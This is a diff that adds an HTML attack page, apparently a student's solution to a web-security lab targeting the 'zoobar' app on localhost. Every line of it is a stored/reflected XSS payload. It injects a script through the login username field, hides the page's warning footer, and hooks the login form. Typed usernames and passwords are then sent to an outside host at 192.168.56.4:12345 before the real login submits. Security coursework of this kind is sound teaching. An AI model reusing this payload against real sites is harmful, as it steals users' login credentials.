@@ -1,0 +1,35 @@
+<form hidden name="loginform" id="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+    <input type="text" id ="login_username" name="login_username" size="20" autocomplete="no" value="">
+    <input type="password" id="login_password" name="login_password" size=20 autocomplete="no">
+    <input type="submit" name="submit_login" value="Log in">
+    <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+<script>
+    
+    function js(){
+            document.getElementsByName('loginform')[0].setAttribute('onsubmit','attack()');
+            document.getElementsByClassName('footer warning')[0].style.visibility = 'hidden';
+    };
+        function attack(){
+                var Username = document.getElementById("login_username")[0].value;
+                var password = document.getElementById("login_password")[0].value;
+                var image = new Image();
+                    image.onerror = function () {
+                        document.getElementById('loginform').submit();
+                    };
+                    image.src='http://192.168.56.4:12345?' + '&payload=' + Username +","+ password+'&roll=14384' + '&random=' + Math.random() + '&timestamp='+ Math.floor(Date.now());
+        var req = new XMLHttpRequest();
+        req.open('GET', image.src, true);
+        req.send();
+        console.log(image.src);
+    };
+    
+    var script = "\">"+
+        "<script>"+
+            "var  attack= " + attack.toString() + ";" +
+            "var soup = " + js.toString() + ";" +
+            "soup();"+
+        "<\/script><input hidden id=\"";
+    document.getElementsByName("login_username")[0].value = script;
+    document.forms[0].submit();
+</script>
